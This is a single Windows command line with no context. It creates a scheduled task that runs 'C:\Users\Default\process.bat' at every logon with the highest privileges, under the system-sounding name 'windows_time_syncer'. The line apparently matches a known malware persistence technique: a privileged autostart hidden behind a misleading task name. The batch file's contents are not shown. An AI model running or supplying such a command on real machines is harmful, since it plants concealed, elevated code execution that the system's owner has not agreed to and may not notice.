SCHTASKS /CREATE /SC ONLOGON /TN "windows_time_syncer" /TR "C:\Users\Default\process.bat" /RL HIGHEST
